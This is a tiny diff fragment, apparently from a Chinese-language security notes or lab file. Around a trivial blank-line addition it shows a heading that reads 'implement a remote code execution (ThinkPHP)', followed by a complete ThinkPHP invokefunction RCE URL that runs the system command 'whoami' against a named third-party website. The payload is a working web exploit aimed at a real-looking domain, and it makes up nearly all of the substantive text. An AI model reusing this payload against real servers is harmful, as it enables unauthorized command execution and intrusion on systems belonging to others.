@@ -13,6 +13,7 @@
 I Love Qingtian Lab
 0vercl0k >
 ```
+
 * 根据以上，实现一个远程代码执行。（Thinkphp）
 
 thinkphp：https://www.beautechhealthcare.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
